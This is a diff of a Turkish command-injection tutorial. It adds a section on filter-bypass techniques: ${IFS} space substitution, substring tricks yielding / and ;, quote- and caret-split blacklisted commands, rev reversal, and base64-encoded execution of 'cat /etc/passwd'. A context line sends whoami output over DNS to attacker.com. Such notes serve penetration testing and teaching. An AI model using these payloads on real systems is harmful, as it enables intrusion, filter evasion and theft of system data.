@@ -66,37 +66,74 @@ http://example.com/ping?ip=127.0.0.1; nslookup $(whoami).attacker.com
 
 Sistem bilgisi saldırgan sunucusuna gönderilir.
 
-## Filtreleri Bypasslamak
-### {IFS} (Internal Field Separator)
-- Amaç: Filtrelenmiş boşluk karakterlerini atlatmak.
-- Örnek: ``` ping{IFS}-c{IFS}1{IFS}127.0.0.1 ``` → boşluk yerine {IFS} kullanarak komut hala çalışır.
-- Faydası: Özellikle whitelist veya regex tabanlı filtreleri bypass etmek için kullanılır.
-- Not: {IFS} sadece POSIX/Linux ortamında çalışır.
-
-### rev Komutu
-- Amaç: Komutun tersini yazarak filtreleri atlatmak ve shell üzerinden geri çevirmek.
+# Command Injection’da Filtre Bypass Teknikleri
+Command Injection testlerinde bazen uygulamalar belirli karakterleri veya komutları filtreler. Bu durumda klasik payload’lar çalışmaz. İşte farklı bypass teknikleri ve mantıkları:
+## {IFS} (Internal Field Separator)
+- Ne işe yarar: Boşluk karakterleri filtrelendiğinde kullanılabilir.
+- Mantık: {IFS} POSIX/Linux ortamlarında boşluk yerine geçer. Regex veya whitelist filtrelerini atlatmak için idealdir.
 Örnek:
 ```bash
-echo "dne" | rev  # output: end
+ping${IFS}-c${IFS}1${IFS}127.0.0.1
 ```
-- Kullanım: Filtreler “whoami” gibi blacklisted kelimeleri engelliyorsa, tersini yazıp rev ile düzeltip çalıştırabilirsin.
 
-Saldırı örneği:
+Burada boşluk yerine ${IFS} kullanıldı, komut hâlâ çalışır.
+
+## Karakter ve Substring Manipülasyonları
+Bazı filtreler ;, / veya belirli karakterleri engeller. Karakterleri substring veya array manipülasyonu ile bypass edebiliriz.
+
+Örnekler:
+- Linux / karakteri:
 ```bash
-echo imirh | rev  # whoami çalıştırır
+echo ${PATH:0:1}   # PATH değişkeninin ilk karakteri
 ```
-### Base64
-- Kullanım: Payload’ı Base64 ile encode edip, shell içinde decode ederek çalıştırmak.
+- Windows %HOMEPATH%:
+```powershell
+echo %HOMEPATH:~6,-11%
+```
+
+- ; karakteri (Linux):
+```bash
+echo ${LS_COLORS:10:1}
+```
+- ; karakteri (Windows PowerShell):
+```powershell
+$env:HOMEPATH[0]
+```
+3. Blacklist Komutları Bypasslamak
+- Mantık: Filtre belirli kelimeleri engelliyorsa, stringi parçalayıp yeniden birleştirebiliriz.
+
+Linux Örnekleri:
+```bash
+w'h'o'am'i
+w"h"o"am"i
+who$@ami
+(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+$(a="WhOaMi"; printf %s "${a,,}")
+```
+
+Windows Örnekleri:
+```bash
+who^ami
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+$(a="WhOaMi"; printf %s "${a,,}")
+```
+## rev Komutu
+- Mantık: Filtre belirli komut kelimelerini engelliyorsa, kelimeyi ters yazıp rev ile düzeltebiliriz.
+
 Örnek:
 ```bash
-echo "c2ggLWkgL3RtcA==" | base64 -d | bash
+$(rev<<<'imaohw')
 ```
-- Açıklama: c2ggLWkgL3RtcA== → sh -i /tmp komutunu temsil eder.
-- Faydası: WAF/filtreler komutu direkt göremez, shell decode edip çalıştırır.
 
-### Hex Encoding
-- Kullanım: Karakterleri hex ile kodlayıp shell üzerinde decode etmek.
-- Linux örnek:
+'imaohw' → ters yazılmış whoami, rev ile shell’de düzeltip çalıştırılır.
+
+## Base64 Encoding
+- Mantık: Payload’ı Base64’e encode edip shell içinde decode ederek çalıştırmak, filtreleri veya WAF’ları atlatır.
+
+Örnek:
 ```bash
-echo -e "\x73\x68\x20\x2d\x69"  # sh -i
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk==)
 ```
+
+"Y2F0IC9ldGMvcGFzc3dk==" → cat /etc/passwd komutunu temsil eder. Filtre doğrudan komutu göremez.
+
